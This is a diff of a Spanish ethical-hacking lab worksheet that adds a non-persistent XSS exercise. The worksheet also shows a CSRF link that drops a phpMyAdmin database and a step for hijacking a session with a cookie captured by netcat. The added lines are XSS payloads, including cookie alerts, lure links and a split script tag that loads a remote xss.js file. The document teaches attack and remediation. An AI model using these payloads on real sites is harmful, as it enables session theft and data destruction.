@@ -59,9 +59,28 @@ CSRF
 
 <a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
 
-XSS persistente
+3.- XSS non-persistente
 
-3.- copiar los archivos que se encuentran en
+utilizar los siguientes string para inyectar codigo en la DB use las paginas que ya tiene instaladas del lab anterior
+
+-----
+<script>alert("XSS")</script>
+<script>alert('XSS')</script>/
+<script>alert('XSS')</script>.
+<script>java<b></b>script:alert(document.cookie)</script>
+<script>java<b></b>script:alert("XSS")</script>
+
+-----
+<a href="[http://<XSS-host]/xssfile?bad request">Free computer!</a>
+<iframe src="[http://<XSS-host]/xssfile?bad request">Free Computer!</iframe>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://www.hack718.cl/xss.js"></SCRIPT>
+-----
+
+para ver los resultados utilice search.php
+
+
+XSS persistente
+4.- copiar los archivos que se encuentran en
 
 https://github.com/pumanzor/ethical/tree/master/lab/xss
 
@@ -116,9 +135,9 @@ cambiar el PHPSESSID
 
 y reemplazar el valor de la sesion por la variable capturada en netcat
 
-4.- Inicie un scanner (OWASP-ZAP) con alguna herramienta de evaluacion de vulnerabilidades al sitio web bajo estudio.
+5.- Inicie un scanner (OWASP-ZAP) con alguna herramienta de evaluacion de vulnerabilidades al sitio web bajo estudio.
 
-5.- modifique el codigo para remediar XSS.
+6.- modifique el codigo para remediar XSS.
 
-6.- Ejecute el scanner nuevamente, compare resultados.
+7.- Ejecute el scanner nuevamente, compare resultados.
 
